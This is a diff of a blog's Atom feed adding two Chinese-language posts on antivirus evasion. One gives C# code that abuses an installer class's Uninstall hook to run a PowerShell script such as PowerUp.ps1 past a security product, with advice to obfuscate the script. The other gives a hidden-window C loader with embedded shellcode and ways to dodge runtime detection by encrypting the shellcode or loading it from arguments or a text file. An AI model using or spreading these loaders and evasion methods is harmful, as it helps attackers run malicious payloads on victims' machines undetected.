@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://github.com/"/>
-  <updated>2020-04-26T02:48:39.678Z</updated>
+  <updated>2020-04-26T04:32:21.948Z</updated>
   <id>https://github.com/</id>
   
   <author>
@@ -15,6 +15,55 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>C#底层调用powershell过杀软</title>
+    <link href="https://github.com/2020/04/26/C#%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
+    <id>https://github.com/2020/04/26/C#%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
+    <published>2020-04-26T04:30:27.000Z</published>
+    <updated>2020-04-26T04:32:21.948Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。</strong></p><p>国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用</p><p>从C#中调用</p><p>添加运行powershell需要的程序包：</p><p>C#调用powershell安装system.management.automation.dll：</p><p>管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可</p><pre><code>using System; using System.Configuration.Install; using System.Runtime.InteropServices; using System.Management.Automation.Runspaces; public class Program { public static void Main() { } } [System.ComponentModel.RunInstaller(true)] public class Sample : System.Configuration.Install.Installer { public override void Uninstall(System.Collections.IDictionary savedState) { Mycode.Exec(); } } public class Mycode { public static void Exec() { string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;); RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create(); Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg); rspace.Open(); Pipeline pipeline = rspace.CreatePipeline(); pipeline.Commands.AddScript(command); pipeline.Invoke(); } }</code></pre><p>PS1文件需要适当混淆以过静态查杀</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;strong&gt;这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;国内某数字杀软，会拦截powershell的运行，以前常用的复制powershel
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>C内存加载过杀软</title>
+    <link href="https://github.com/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
+    <id>https://github.com/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
+    <published>2020-04-26T03:45:03.000Z</published>
+    <updated>2020-04-26T03:49:11.228Z</updated>
+    
+    <content type="html"><![CDATA[<p>C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；</p><p>如最常用的加载器：</p><pre><code>#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)unsigned char shellcode[] =&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&quot;&quot;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&quot;&quot;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01&quot;&quot;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;&quot;\x45\x81\x3e\x43\x72\x65\x61\x75&quot;&quot;\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&quot;&quot;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&quot;&quot;\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53&quot;&quot;\x53\x53\x53\x53\x52\x53\xff\xd7&quot;;void main(){    ((void(*)(void))&amp;shellcode)();}</code></pre><p>解决方法1：加密shellcode再解密运行（最后用一些比较偏的加密算法）</p><p>解决方法2：pyaload分离<br>[1]借助main的入口参数，用户直接输shellcode</p><p>[2]从txt文件中加载shellcode</p><p>这个当初比较头疼，因为C语言这方面确实不大行，从txt读取shellcode的时候出现问题;记录如下：</p><ul><li>获取txt中shellcode长度，申请内存空间</li></ul><ul><li>.使用fread读取txt为字符串，加载难以识别出shellcode    </li></ul><ul><li>.fscanf判定shellcode分割符需要进行转义(这点是乔哥解决的，我乔哥还是强啊)</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；&lt;/p&gt;
+&lt;p&gt;如最常用的加载器：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#pra
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>incognito Stealing Windows Access Tokens</title>
